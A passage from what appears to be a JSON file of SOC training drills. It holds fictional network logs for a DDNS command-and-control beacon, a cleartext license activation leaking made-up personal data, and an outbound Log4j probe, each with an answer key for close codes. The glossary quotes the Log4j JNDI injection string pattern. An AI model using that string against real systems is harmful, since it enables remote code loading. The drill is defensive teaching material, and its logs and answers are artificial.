              "conn_state=S0",
              "query=starbright.ddns.example",
              "",
              "# DNS A lookups across ~3 days (chronological samples)",
              "---",
              "{\"_path\":\"dns\",\"ts\":\"2026-08-02T15:54:53.503193Z\",\"uid\":\"Cfict0003101\",\"id.orig_h\":\"10.44.31.21\",\"id.resp_h\":\"10.44.0.53\",\"id.resp_p\":53,\"query\":\"starbright.ddns.example\",\"qtype_name\":\"A\",\"rcode_name\":\"NOERROR\",\"answers\":[\"203.0.113.141\"],\"id.vlan\":4431,\"proto\":\"udp\"}",
              "---",
              "{\"_path\":\"dns\",\"ts\":\"2026-08-02T18:18:42.552825Z\",\"uid\":\"Cfict0003102\",\"id.orig_h\":\"10.44.31.21\",\"id.resp_h\":\"10.44.0.53\",\"id.resp_p\":53,\"query\":\"starbright.ddns.example\",\"qtype_name\":\"A\",\"rcode_name\":\"NOERROR\",\"answers\":[\"203.0.113.141\"],\"id.vlan\":4431,\"proto\":\"udp\"}",
              "---",
              "{\"_path\":\"dns\",\"ts\":\"2026-08-03T00:08:24.801486Z\",\"uid\":\"Cfict0003103\",\"id.orig_h\":\"10.44.31.21\",\"id.resp_h\":\"10.44.0.53\",\"id.resp_p\":53,\"query\":\"starbright.ddns.example\",\"qtype_name\":\"A\",\"rcode_name\":\"NOERROR\",\"answers\":[\"203.0.113.141\"],\"id.vlan\":4431,\"proto\":\"udp\"}",
              "---",
              "{\"_path\":\"dns\",\"ts\":\"2026-08-03T14:22:11.410002Z\",\"uid\":\"Cfict0003104\",\"id.orig_h\":\"10.44.31.21\",\"id.resp_h\":\"10.44.0.53\",\"id.resp_p\":53,\"query\":\"starbright.ddns.example\",\"qtype_name\":\"A\",\"rcode_name\":\"NOERROR\",\"answers\":[\"203.0.113.141\"],\"id.vlan\":4431,\"proto\":\"udp\"}",
              "---",
              "{\"_path\":\"dns\",\"ts\":\"2026-08-04T17:36:43.694568Z\",\"uid\":\"Cfict0003105\",\"id.orig_h\":\"10.44.31.21\",\"id.resp_h\":\"10.44.0.53\",\"id.resp_p\":53,\"query\":\"starbright.ddns.example\",\"qtype_name\":\"A\",\"rcode_name\":\"NOERROR\",\"answers\":[\"203.0.113.141\"],\"id.vlan\":4431,\"proto\":\"udp\"}",
              "---",
              "{\"_path\":\"dns\",\"ts\":\"2026-08-04T19:00:37.330815Z\",\"uid\":\"Cfict0003106\",\"id.orig_h\":\"10.44.31.21\",\"id.resp_h\":\"10.44.0.53\",\"id.resp_p\":53,\"query\":\"starbright.ddns.example\",\"qtype_name\":\"A\",\"rcode_name\":\"NOERROR\",\"answers\":[\"203.0.113.141\"],\"id.vlan\":4431,\"proto\":\"udp\"}",
              "",
              "# TCP follow-ups to the A answer (all S0 in sampled window · 8067 total)",
              "---",
              "{\"_path\":\"conn\",\"ts\":\"2026-08-02T15:51:41.381743Z\",\"uid\":\"Cfict0003201\",\"id.orig_h\":\"10.44.31.21\",\"id.resp_h\":\"203.0.113.141\",\"id.resp_p\":4061,\"proto\":\"tcp\",\"conn_state\":\"S0\",\"history\":\"S\",\"id.vlan\":4431,\"id.resp_h_name.vals\":[\"starbright.ddns.example\"]}",
              "---",
              "{\"_path\":\"conn\",\"ts\":\"2026-08-02T16:00:02.840867Z\",\"uid\":\"Cfict0003202\",\"id.orig_h\":\"10.44.31.21\",\"id.resp_h\":\"203.0.113.141\",\"id.resp_p\":4061,\"proto\":\"tcp\",\"conn_state\":\"S0\",\"history\":\"S\",\"id.vlan\":4431,\"id.resp_h_name.vals\":[\"starbright.ddns.example\"]}",
              "---",
              "{\"_path\":\"conn\",\"ts\":\"2026-08-04T17:57:58.424017Z\",\"uid\":\"Cfict0003203\",\"id.orig_h\":\"10.44.31.21\",\"id.resp_h\":\"203.0.113.141\",\"id.resp_p\":4061,\"proto\":\"tcp\",\"conn_state\":\"S0\",\"history\":\"S\",\"id.vlan\":4431,\"id.resp_h_name.vals\":[\"starbright.ddns.example\"]}",
              "---",
              "{\"_path\":\"conn\",\"ts\":\"2026-08-04T18:44:00.550064Z\",\"uid\":\"Cfict0003204\",\"id.orig_h\":\"10.44.31.21\",\"id.resp_h\":\"203.0.113.141\",\"id.resp_p\":4061,\"proto\":\"tcp\",\"conn_state\":\"S0\",\"history\":\"S\",\"id.vlan\":4431,\"id.resp_h_name.vals\":[\"starbright.ddns.example\"]}",
              "---",
              "{\"_path\":\"conn\",\"ts\":\"2026-08-04T19:12:20.001428Z\",\"uid\":\"Cfict0003205\",\"id.orig_h\":\"10.44.31.21\",\"id.resp_h\":\"203.0.113.141\",\"id.resp_p\":4061,\"proto\":\"tcp\",\"conn_state\":\"S0\",\"history\":\"S\",\"id.vlan\":4431,\"id.resp_h_name.vals\":[\"starbright.ddns.example\"]}",
              "---",
              "{\"_path\":\"x509\",\"ts\":\"2026-08-04T17:08:14.807151Z\",\"certificate.issuer\":\"O=RailBeacon C2\",\"certificate.subject\":\"O=RailBeacon C2\",\"certificate.key_type\":\"ecdsa\",\"certificate.key_length\":384,\"certificate.not_valid_before\":\"2026-07-29T09:17:24.000000Z\",\"certificate.not_valid_after\":\"2027-07-29T09:17:24.000000Z\",\"certificate.serial\":\"CCF4C957D5D89823A8C683353919CB06\",\"fingerprint\":\"d119a70ffbc849a1848bce7dc46d58337d7a49391bda9b45ca144d956f10537e\",\"host_cert\":true,\"vlan\":4431}"
            ]
          }
        ]
      },
      "auto-class": {
        "name": "Class hypothesis",
        "tag": "[ops]",
        "narration": "First-pass tooling maps the VLAN to Social Engineering Lab and suggests BH Benign coursework. Syllabus samples list phishing-kit and browser labs; they do not list starbright.ddns.example or multi-day external beacons. VLAN membership is a hint to check peers, not a close code.",
        "evidence": [
          {
            "id": "ev-class-claim",
            "label": "auto-class claim · not in syllabus",
            "detail": "Tooling guessed coursework from the VLAN label. Syllabus does not cover this DDNS destination; the claim still needs peer proof.",
            "hint": [
              "NOT LISTED",
              "auto_class_claim=BH Benign coursework"
            ]
          }
        ],
        "exits": [
          {
            "to": "class-peers",
            "label": "Search class peer traffic"
          },
          {
            "to": "c2-sessions",
            "label": "Inspect follow-up sessions"
          },
          {
            "to": "observed-logs",
            "label": "Return to observed DNS"
          }
        ],
        "logs": [
          {
            "id": "log-auto-class",
            "title": "auto-class first-pass · Social Engineering Lab",
            "lines": [
              "# auto-class first-pass · Social Engineering Lab VLAN",
              "src=10.44.31.21",
              "vlan_label=Social Engineering Lab",
              "auto_class_claim=BH Benign coursework",
              "hostname=desktop-lab31a.local",
              "",
              "# syllabus coverage check (course map excerpt)",
              "syllabus_topics=phishing-kit labs, browser credential harvest demos, awareness tabletop",
              "syllabus_ddns=starbright.ddns.example → NOT LISTED",
              "syllabus_external_beacon=multi-day DDNS callbacks → NOT LISTED",
              "note=VLAN membership is a peer-check hint, not a close code"
            ]
          }
        ]
      },
      "class-peers": {
        "name": "Class peer traffic",
        "tag": "[ops]",
        "narration": "Same Social Engineering Lab VLAN window shows zero peer hosts resolving starbright.ddns.example or talking to 203.0.113.141:4061. Pattern is unique to 10.44.31.21 (947 DNS hits on this host alone). Missing peers kill the auto-class BH Benign path.",
        "evidence": [
          {
            "id": "ev-no-peers-c2",
            "label": "no class peers · singleton C2",
            "detail": "Sanctioned class C2 would show peers on the lab VLAN. This host is alone; BH Benign does not fit.",
            "hint": [
              "peers_matching=0"
            ]
          }
        ],
        "exits": [
          {
            "to": "decision",
            "label": "Move to close codes",
            "requiresEvidence": 3
          },
          {
            "to": "auto-class",
            "label": "Return to class hypothesis"
          },
          {
            "to": "c2-sessions",
            "label": "Inspect follow-up sessions"
          }
        ],
        "logs": [
          {
            "id": "log-class-peers",
            "title": "peer search · Social Engineering Lab → same DDNS",
            "lines": [
              "# peer search · Social Engineering Lab VLAN → same DDNS query",
              "query=starbright.ddns.example",
              "scope=Social Engineering Lab VLAN samples · same multi-day window",
              "hits  id.orig_h",
              " 947  10.44.31.21",
              "peers_matching=0",
              "note=pattern unique to 10.44.31.21 — sanctioned class C2 would show peers"
            ]
          }
        ]
      },
      "decision": {
        "name": "Close codes",
        "tag": "[decision]",
        "narration": "Evidence covers 947 multi-day (~3 day) DDNS lookups for starbright.ddns.example, 8067 S0 sessions to the resolved A on :4061 with C2-like TLS, an auto-class claim the syllabus does not support, and zero classroom peers on the same destination. One BH close code fits.",
        "isDecision": true,
        "actions": [
          {
            "id": "true-positive",
            "label": "True Positive",
            "correct": true,
            "resultNote": "Known C2/DDNS with a multi-day beacon and no class peers is a confirmed compromised-or-infected endpoint finding. Close True Positive and pursue owner contact."
          },
          {
            "id": "false-positive",
            "label": "False Positive",
            "resultNote": "False Positive fits a wrong detector assertion. The DNS and session evidence are real; the alert was not a product failure."
          },
          {
            "id": "bh-benign",
            "label": "BH Benign",
            "resultNote": "BH Benign fits sanctioned class traffic. VLAN label alone is not enough when peers and syllabus coverage are absent."
          }
        ]
      }
    },
    "endings": {
      "win": {
        "title": "Closed True Positive",
        "narration": "A-6610 closed True Positive. On-site IR treats 10.44.31.21 as a likely prior compromise with active DDNS callbacks. Handover notes the missing class-peer pattern."
      },
      "lose": {
        "title": "Wrong close code",
        "narration": "The queue records the chosen close code against evidence that still shows singleton C2 outside proven class sanction. The correct first close is below."
      },
      "timeout": {
        "title": "Window closed",
        "narration": "The queue moved on before a close code landed. The evidence trail remains below for review."
      }
    },
    "timeline": [
      {
        "id": "tl-cert",
        "t": "17:08:14",
        "label": "self-signed RailBeacon C2 certificate observed",
        "nodes": [
          "c2-sessions"
        ],
        "hint": [
          "17:08:14",
          "O=RailBeacon C2"
        ],
        "tone": "warn"
      },
      {
        "id": "tl-dns-day3",
        "t": "17:36:43",
        "label": "DDNS A lookup still resolving on day 3 of the window",
        "nodes": [
          "c2-sessions",
          "observed-logs"
        ],
        "hint": [
          "17:36:43",
          "starbright.ddns.example"
        ],
        "tone": "info"
      },
      {
        "id": "tl-s0",
        "t": "18:44:00",
        "label": "TCP SYN to resolved A on :4061 stays S0",
        "nodes": [
          "c2-sessions"
        ],
        "hint": [
          "18:44:00",
          "conn_state"
        ],
        "tone": "warn"
      },
      {
        "id": "tl-dns-late",
        "t": "19:00:37",
        "label": "another starbright.ddns.example A answer returns 203.0.113.141",
        "nodes": [
          "c2-sessions"
        ],
        "hint": [
          "19:00:37"
        ],
        "tone": "info"
      },
      {
        "id": "tl-alert",
        "t": "19:32:00",
        "label": "A-6610 opens on the multi-day DDNS + S0 rollup",
        "nodes": [
          "observed-logs"
        ],
        "hint": [
          "947",
          "days=3"
        ],
        "tone": "critical"
      }
    ]
  },
  {
    "id": "stagecast-license-pii-http",
    "meta": {
      "title": "Cleartext license PII, vendor app",
      "briefing": "Alert A-6621 is open: cleartext HTTP license activation from 10.44.32.40 to activate.stagecast.example on general Wi-Fi. A GET then POST to /activate.php at 19:06:43–19:06:44 carries name, email, and device serial (SC-77419) in the clear. Wire fields, app identity, and expected-vendor pattern separate hygiene debt from intrusion. The correct BH close code is the goal. Target: under 3 minutes.",
      "targetSeconds": 180
    },
    "glossary": {
      "cleartext": "Sent with no encryption — anyone on the path can read it, like a postcard instead of a sealed letter.",
      "HTTP": "The basic language of the web. Alone (without TLS) it is not private.",
      "PII": "Personal information that can identify someone — name, email, and similar fields.",
      "POST body": "The data a browser or app sends in an HTTP request — here, the license form fields.",
      "license activation": "The app phoning home to prove it is allowed to run — often older products still use plain HTTP.",
      "StageCast": "Fictional media/playback vendor used in this drill (stands in for a real licensor).",
      "serial": "A device or product ID string — useful to IT, sensitive if leaked in the clear.",
      "Pivot": "Jump to another log source using what is already found — follow the breadcrumb.",
      "BH close code": "How Black Hat SOC marks why an alert was closed — the official label for the outcome.",
      "True Positive": "Real bad or real impact that needed incident response. The alert was right and serious.",
      "False Positive": "The alert was wrong — it looked bad but the detection was a mistake.",
      "BH Benign": "Something that looked alarming but is allowed here (for example sanctioned class traffic).",
      "close code": "The final label on an alert that says what kind of finding it turned out to be.",
      "IR": "Incident response — the people and steps used when something real needs handling now.",
      "vendor-normal": "Ugly or leaky behavior that is still how this product is designed to operate."
    },
    "startNode": "observed-logs",
    "nodes": {
      "observed-logs": {
        "name": "Observed traffic",
        "tag": "[http]",
        "narration": "A-6621 · Medium · Cleartext license POST · 10.44.32.40 → activate.stagecast.example · HTTP (no TLS) · port 80 · URI /activate.php · general Wi-Fi. Wire shows a GET at 19:06:43 then a POST at 19:06:44; alert highlights name, email, and serial fields in the POST body (SerialNumber=SC-77419).",
        "evidence": [
          {
            "id": "ev-license-http",
            "label": "cleartext · /activate.php",
            "detail": "Unencrypted HTTP carries a license activation POST to a vendor activation host.",
            "hint": [
              "dst_port=80",
              "/activate.php"
            ]
          }
        ],
        "exits": [
          {
            "to": "post-body",
            "label": "Inspect the POST body"
          },
          {
            "to": "app-profile",
            "label": "Profile the client application"
          },
          {
            "to": "vendor-pattern",
            "label": "Compare vendor-normal pattern"
          }
        ],
        "logs": [
          {
            "id": "log-observed-logs",
            "title": "corelight_http_raw · cleartext license activate rollup",
            "lines": [
              "# corelight_http_raw · cleartext license activate rollup · src 10.44.32.40 · dst port 80",
              "# window for alerted host GET+POST: 19:06:43–19:06:44 (same second-pair)",
              " hits  methods  status  uri",
              "    1  GET      200     /activate.php",
              "    1  POST     200     /activate.php",
              "    2  TOTAL   dst_port=80  tls=absent  host=activate.stagecast.example",
              "note=cleartext HTTP license activation to vendor host; PII fields in POST body"
            ]
          }
        ]
      },
      "post-body": {
        "name": "POST body",
        "tag": "[http]",
        "narration": "POST fields stay in the clear: FirstName=Riley, LastName=Quill, Email=rquill@stagecast.example, Company=StageCast, SerialNumber=SC-77419, computerName=STAGE-MAC-12. Values identify a person and device. Exposure is real hygiene debt; compromise still has to be proven separately.",
        "evidence": [
          {
            "id": "ev-pii-fields",
            "label": "PII in clear · name email serial",
            "detail": "License form leaks personal and device identifiers on attendee Wi-Fi. Ugly and note-worthy; not automatically an intrusion.",
            "hint": [
              "FirstName=Riley",
              "SerialNumber=SC-77419"
            ]
          }
        ],
        "exits": [
          {
            "to": "app-profile",
            "label": "Profile the client application"
          },
          {
            "to": "vendor-pattern",
            "label": "Compare vendor-normal pattern"
          },
          {
            "to": "observed-logs",
            "label": "Return to observed traffic"
          }
        ],
        "logs": [
          {
            "id": "log-post-hint",
            "title": "HINT · corelight_http_raw · cleartext license PII on :80",
            "lines": [
              "# Hint from the wire (obfuscated from live Corelight http rows)",
              "# Same shape the hunt thread called out: license activate.php POST with name/email/serial in the clear",
              "id.orig_h=10.44.32.40",
              "id.resp_h=203.0.113.50",
              "id.resp_p=80",
              "version=HTTP/1.1",
              "tls=absent",
              "server=Apache",
              "host=activate.stagecast.example",
              "uri=/activate.php?db=9&vendor=20091028&product=4",
              "fields=FirstName,LastName,Email,Company,Zip,Country,SerialNumber,Snapshot",
              "FirstName=Riley",
              "LastName=Quill",
              "Email=rquill@stagecast.example",
              "SerialNumber=SC-77419",
              "user_agent=StageCast Playback Console/1 CFNetwork/3860.600.21 Darwin/25.5.0",
              "note=license form PII + device serial in cleartext POST body on port 80 to vendor activation host",
              "",
              "# Example rows (fields compacted · identities fiction)",
              "{\"_path\":\"http\",\"id.orig_h\":\"10.44.32.40\",\"id.resp_h\":\"203.0.113.50\",\"id.resp_p\":80,\"method\":\"POST\",\"host\":\"activate.stagecast.example\",\"uri\":\"/activate.php?db=9&vendor=20091028&product=4\",\"status_code\":200,\"server\":\"Apache\",\"user_agent\":\"StageCast Playback Console/1 CFNetwork/3860.600.21 Darwin/25.5.0\"}",
              "post_body=Session=1785611203&SerialNumber=SC-77419&RequestNumber=7960422516&FirstName=Riley&LastName=Quill&Company=StageCast&Country=usa&Zip=89109&Email=rquill@stagecast.example&Custom1=StageMac-12&Snapshot=ComputerName=STAGE-MAC-12,User=stageuser,OS=MacPPC,Screen=1512x982,LocalIP=10.44.32.40,CpuType=1635268148,SysVersion=26.5.2,MAC=a483e7124490,ioSN=SCIO77419M0&Confirm=Send",
              "post_reply=<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><!--STAGECASTACTIVATIONRESPONSE:MAXACTIVATIONS--><HTML><HEAD>\\r<TITLE>Activation Error"
            ]
          },
          {
            "id": "log-post-timed",
            "title": "corelight_http_raw · timed activate samples",
            "lines": [
              "# corelight_http_raw · timed activate samples (identities fiction)",
              "id.orig_h=10.44.32.40",
              "id.resp_p=80",
              "version=HTTP/1.1",
              "tls=absent",
              "server=Apache",
              "host=activate.stagecast.example",
              "",
              "# Timed activate exchange (chronological · event ts from _raw_log)",
              "---",
              "{\"_path\":\"http\",\"ts\":\"2026-08-01T19:06:43.912655Z\",\"uid\":\"Cfict0000201\",\"id.orig_h\":\"10.44.32.40\",\"id.resp_h\":\"203.0.113.50\",\"id.resp_p\":80,\"method\":\"GET\",\"host\":\"activate.stagecast.example\",\"uri\":\"/activate.php?db=9&vendor=20091028&product=4\",\"status_code\":200,\"server\":\"Apache\",\"user_agent\":\"StageCast Playback Console/1 CFNetwork/3860.600.21 Darwin/25.5.0\"}",
              "---",
              "{\"_path\":\"http\",\"ts\":\"2026-08-01T19:06:44.334226Z\",\"uid\":\"Cfict0000201\",\"id.orig_h\":\"10.44.32.40\",\"id.resp_h\":\"203.0.113.50\",\"id.resp_p\":80,\"method\":\"POST\",\"host\":\"activate.stagecast.example\",\"uri\":\"/activate.php?db=9&vendor=20091028&product=4\",\"status_code\":200,\"server\":\"Apache\",\"user_agent\":\"StageCast Playback Console/1 CFNetwork/3860.600.21 Darwin/25.5.0\"}",
              "post_body=Session=1785611203&SerialNumber=SC-77419&RequestNumber=7960422516&FirstName=Riley&LastName=Quill&Company=StageCast&Country=usa&Zip=89109&Email=rquill@stagecast.example&Custom1=StageMac-12&Snapshot=ComputerName=STAGE-MAC-12,User=stageuser,OS=MacPPC,Screen=1512x982,LocalIP=10.44.32.40,CpuType=1635268148,SysVersion=26.5.2,MAC=a483e7124490,ioSN=SCIO77419M0&Confirm=Send",
              "post_reply=<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><!--STAGECASTACTIVATIONRESPONSE:MAXACTIVATIONS--><HTML><HEAD>\\r<TITLE>Activation Error"
            ]
          }
        ]
      },
      "app-profile": {
        "name": "Client application",
        "tag": "[asset]",
        "narration": "User-agent and process crumbs match StageCast Playback Console performing a scheduled license check. Destination activate.stagecast.example is the vendor activation endpoint for that product line. Flow is client-initiated registration (GET then POST), not an inbound exploit chain. Overall host traffic is inbound-dominant; this particular flow is a deliberate registration attempt.",
        "evidence": [
          {
            "id": "ev-stagecast-app",
            "label": "StageCast · license client",
            "detail": "Traffic matches the vendor playback app calling its own activation service, not a random phishing POST.",
            "hint": [
              "StageCast Playback Console",
              "activate.stagecast.example"
            ]
          }
        ],
        "exits": [
          {
            "to": "vendor-pattern",
            "label": "Compare vendor-normal pattern"
          },
          {
            "to": "post-body",
            "label": "Inspect the POST body"
          },
          {
            "to": "observed-logs",
            "label": "Return to observed traffic"
          }
        ],
        "logs": [
          {
            "id": "log-app-profile",
            "title": "client application · StageCast Playback Console",
            "lines": [
              "# client application crumbs · src 10.44.32.40 (obfuscated from live http rows + entity profile)",
              "id.orig_h=10.44.32.40",
              "id.orig_network_name=General WiFi",
              "os=macOS",
              "user_agent=StageCast Playback Console/1 CFNetwork/3860.600.21 Darwin/25.5.0",
              "app=StageCast Playback Console",
              "host=activate.stagecast.example",
              "id.resp_p=80",
              "tls=absent",
              "server=Apache",
              "flow=client-initiated license registration (GET then POST)",
              "traffic_shape=inbound-dominant overall; this flow is deliberate app registration",
              "",
              "# Sample row (fields compacted)",
              "---",
              "{\"_path\":\"http\",\"ts\":\"2026-08-01T19:06:43.912655Z\",\"uid\":\"Cfict0000201\",\"id.orig_h\":\"10.44.32.40\",\"id.resp_h\":\"203.0.113.50\",\"id.resp_p\":80,\"method\":\"GET\",\"host\":\"activate.stagecast.example\",\"uri\":\"/activate.php?db=9&vendor=20091028&product=4\",\"status_code\":200,\"server\":\"Apache\",\"user_agent\":\"StageCast Playback Console/1 CFNetwork/3860.600.21 Darwin/25.5.0\",\"client_headers\":{\"Host\":\"activate.stagecast.example\",\"Cache-Control\":\"no-cache\",\"Accept\":\"*/*\",\"User-Agent\":\"StageCast Playback Console/1 CFNetwork/3860.600.21 Darwin/25.5.0\",\"Accept-Language\":\"en-US,en;q=0.9\",\"Accept-Encoding\":\"gzip, deflate\",\"Connection\":\"keep-alive\"}}",
              "note=UA + Host match StageCast Playback Console calling its vendor activation endpoint — not a random phishing POST"
            ]
          }
        ]
      },
      "vendor-pattern": {
        "name": "Vendor-normal check",
        "tag": "[ops]",
        "narration": "Same activation host appears for another StageCast floor device (10.44.32.55) on 2026-08-03 with identical /activate.php URI and field layout (6 hits vs 2 on the alerted host). No second-stage payload, no odd redirect chain, no lateral sweep from 10.44.32.40 in the window. Pattern is known vendor licensing over legacy HTTP.",
        "evidence": [
          {
            "id": "ev-vendor-normal",
            "label": "vendor-normal · recurring activation",
            "detail": "Recurring StageCast activation shape without follow-on malice supports BH Benign over True Positive IR.",
            "hint": [
              "vendor_peers=1"
            ]
          }
        ],
        "exits": [
          {
            "to": "decision",
            "label": "Move to close codes",
            "requiresEvidence": 3
          },
          {
            "to": "app-profile",
            "label": "Return to client application"
          },
          {
            "to": "post-body",
            "label": "Inspect the POST body"
          }
        ],
        "logs": [
          {
            "id": "log-vendor-pattern",
            "title": "vendor-normal · recurring StageCast activate.php",
            "lines": [
              "# vendor-normal search · same activate host + URI shape (obfuscated from live http rows)",
              "query=host=activate.stagecast.example and uri contains \"/activate.php\"",
              "scope=general Wi-Fi floor samples",
              "hits  id.orig_h  note",
              "   2  10.44.32.40         alerted host · 2026-08-01 19:06 GET+POST",
              "   6  10.44.32.55        peer StageCast floor device · 2026-08-03 00:26–00:27",
              "vendor_peers=1",
              "field_layout=FirstName,LastName,Email,Company,SerialNumber,Snapshot,Confirm",
              "follow_on=none observed (no second-stage payload, no redirect chain, no lateral sweep)",
              "",
              "# Peer timed sample (chronological · event ts from _raw_log)",
              "---",
              "{\"_path\":\"http\",\"ts\":\"2026-08-03T00:26:56.855357Z\",\"uid\":\"Cfict0000210\",\"id.orig_h\":\"10.44.32.55\",\"id.resp_h\":\"203.0.113.50\",\"id.resp_p\":80,\"method\":\"GET\",\"host\":\"activate.stagecast.example\",\"uri\":\"/activate.php?db=9&vendor=20091028&product=4\",\"status_code\":200,\"server\":\"Apache\",\"user_agent\":\"StageCast Playback Console/1 CFNetwork/3860.600.21 Darwin/25.5.0\"}",
              "---",
              "{\"_path\":\"http\",\"ts\":\"2026-08-03T00:27:01.842578Z\",\"uid\":\"Cfict0000210\",\"id.orig_h\":\"10.44.32.55\",\"id.resp_h\":\"203.0.113.50\",\"id.resp_p\":80,\"method\":\"POST\",\"host\":\"activate.stagecast.example\",\"uri\":\"/activate.php?db=9&vendor=20091028&product=4\",\"status_code\":200,\"server\":\"Apache\",\"user_agent\":\"StageCast Playback Console/1 CFNetwork/3860.600.21 Darwin/25.5.0\"}",
              "post_body=Session=1785716821&SerialNumber=SC-77419&RequestNumber=7960414707&FirstName=Riley&LastName=Quill&Company=StageCast&Country=usa&Zip=89109&Email=rquill@stagecast.example&Custom1=StageMac-12&Snapshot=ComputerName=STAGE-MAC-12,User=stageuser,OS=MacPPC,Screen=1512x982,LocalIP=10.44.32.55,CpuType=1635268148,SysVersion=26.5.2,MAC=a483e71255ab,ioSN=SCIO77419M1&Confirm=Send",
              "post_reply=<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><!--STAGECASTACTIVATIONRESPONSE:MAXACTIVATIONS--><HTML><HEAD>\\r<TITLE>Activation Error",
              "note=identical URI + field layout on a second floor host — known vendor licensing over legacy HTTP"
            ]
          }
        ]
      },
      "decision": {
        "name": "Close codes",
        "tag": "[decision]",
        "narration": "Evidence covers cleartext license PII including serial SC-77419 on /activate.php at 19:06:44, a StageCast Playback Console client talking to activate.stagecast.example, and a recurring vendor-normal pattern on a peer floor host without follow-on compromise. One BH close code fits.",
        "isDecision": true,
        "actions": [
          {
            "id": "true-positive",
            "label": "True Positive",
            "resultNote": "True Positive fits active intrusion or hostile exfil needing IR now. This is a designed vendor license POST; track as hygiene outreach, not intrusion close."
          },
          {
            "id": "false-positive",
            "label": "False Positive",
            "resultNote": "False Positive fits a wrong detector assertion. The cleartext PII fields are real; the alert correctly saw sensitive data on the wire."
          },
          {
            "id": "bh-benign",
            "label": "BH Benign",
            "correct": true,
            "resultNote": "BH Benign fits known vendor operational behavior. Cleartext PII is worth a courtesy note to the vendor/owner, but the close for compromise is BH Benign."
          }
        ]
      }
    },
    "endings": {
      "win": {
        "title": "Closed BH Benign",
        "narration": "A-6621 closed BH Benign. Cleartext StageCast licensing is logged as vendor hygiene; no intrusion IR ticket is opened. Handover notes source 10.44.32.40 and activate.stagecast.example."
      },
      "lose": {
        "title": "Wrong close code",
        "narration": "The queue records the chosen close code against evidence that still shows known vendor license activation. The correct first close is below."
      },
      "timeout": {
        "title": "Window closed",
        "narration": "The queue moved on before a close code landed. The evidence trail remains below for review."
      }
    },
    "timeline": [
      {
        "id": "tl-get",
        "t": "19:06:43",
        "label": "GET /activate.php to activate.stagecast.example returns 200",
        "nodes": [
          "observed-logs",
          "app-profile"
        ],
        "hint": [
          "19:06:43",
          "/activate.php"
        ],
        "tone": "info"
      },
      {
        "id": "tl-post",
        "t": "19:06:44",
        "label": "POST /activate.php carries FirstName/Email/SerialNumber in the clear",
        "nodes": [
          "post-body"
        ],
        "hint": [
          "19:06:44",
          "SerialNumber=SC-77419"
        ],
        "tone": "warn"
      },
      {
        "id": "tl-alert",
        "t": "21:27:54",
        "label": "A-6621 opens on cleartext license PII to activate.stagecast.example",
        "nodes": [
          "observed-logs"
        ],
        "hint": [
          "dst_port=80",
          "/activate.php"
        ],
        "tone": "critical"
      }
    ]
  },
  {
    "id": "noc-log4j-sensor-test",
    "meta": {
      "title": "Outbound Log4j, NOC sensor test",
      "briefing": "Alert A-6633 is open: Suricata and NGFW both fire in the same minute (23:20) on outbound Log4j-style exploit probes from 10.44.1.14 on NOC wired toward alwayshttp.example. Destination reputation, source network, and detection overlap separate sensor validation from guest compromise. The correct BH close code is the goal. Target: under 3 minutes.",
      "targetSeconds": 180
    },
    "glossary": {
      "Log4j": "A famous Java logging bug class — exploit probes try to trigger remote class loading over lookups.",
      "Suricata": "An IDS that watches packets and fires named rules when traffic matches known attacks.",
      "NGFW": "Next-gen firewall — blocks and alerts on application-layer threats, not just ports.",
      "NOC wired": "The wired network used by the operations floor — staff and test gear, not guest Wi-Fi.",
      "alwayshttp.example": "Fictional cleartext HTTP test site used in this drill (stands in for a known benign HTTP echo host).",
      "sensor validation": "Intentionally firing known-bad payloads at a safe target to prove detectors still work.",
      "JNDI": "A Java lookup string attackers stuff into Log4j probes — often seen as ${jndi:ldap://…} in a header.",
      "Pivot": "Jump to another log source using what is already found — follow the breadcrumb.",
      "BH close code": "How Black Hat SOC marks why an alert was closed — the official label for the outcome.",
      "True Positive": "Real bad or real impact that needed incident response. The alert was right and serious.",
      "False Positive": "The alert was wrong — it looked bad but the detection was a mistake.",
      "BH Benign": "Something that looked alarming but is allowed here (for example sanctioned class traffic).",
      "close code": "The final label on an alert that says what kind of finding it turned out to be.",
      "IR": "Incident response — the people and steps used when something real needs handling now.",
      "cleartext": "Sent with no encryption — anyone on the path can read it, like a postcard instead of a sealed letter.",
      "HTTP": "The basic language of the web. Alone (without TLS) it is not private."
    },
    "startNode": "observed-logs",
    "nodes": {
      "observed-logs": {
        "name": "Observed traffic",
        "tag": "[alert]",
        "narration": "A-6633 · High · Outbound Log4j probe · 10.44.1.14 → alwayshttp.example · HTTP cleartext · Suricata (3 ET signatures) and NGFW Critical threat both alert in the same minute (23:20). Source network label: NOC wired.",
        "evidence": [
          {
            "id": "ev-log4j-alert",
            "label": "Log4j probe · dual detections",
            "detail": "Outbound Log4j-style exploit content is detected by two independent engines in the same window.",
            "hint": [
              "engines=2",
              "same_minute=true"
            ]
          }
        ],
        "exits": [
          {
            "to": "dest-rep",
            "label": "Check destination reputation"
          },
          {
            "to": "source-net",
            "label": "Check source network"
          },
          {
            "to": "detect-overlap",
            "label": "Compare detection overlap"
          }
        ],
        "logs": [
          {
            "id": "log-observed-logs",
            "title": "alert rollup · outbound Log4j dual-engine",
            "lines": [
              "# alert rollup · A-6633 · outbound Log4j probe · src 10.44.1.14",
              "# window: Suricata + NGFW both fire in the same minute (23:20 UTC)",
              " engines  product              severity   action   dest",
              "       1  Suricata/ET (×3)     Major      allowed  alwayshttp.example:80",
              "       1  NGFW threat          Critical   drop     alwayshttp.example:80",
              "       2  TOTAL               same_minute=true  engines=2  tls=absent  proto=http"
            ]
          }
        ]
      },
      "dest-rep": {
        "name": "Destination reputation",
        "tag": "[intel]",
        "narration": "alwayshttp.example resolves NOERROR to 203.0.113.80:80 with TLS absent. Intel labels it a known cleartext HTTP echo/test host used for connectivity checks, not malware staging. Destination choice matches sensor-validation practice: safe, boring, and deliberately plaintext.",
        "evidence": [
          {
            "id": "ev-test-dest",
            "label": "dest · known HTTP test host",
            "detail": "Target is a benign cleartext test site, not attacker infrastructure.",
            "hint": [
              "alwayshttp.example",
              "known_http_test=true"
            ]
          }
        ],
        "exits": [
          {
            "to": "source-net",
            "label": "Check source network"
          },
          {
            "to": "detect-overlap",
            "label": "Compare detection overlap"
          },
          {
            "to": "observed-logs",
            "label": "Return to observed traffic"
          }
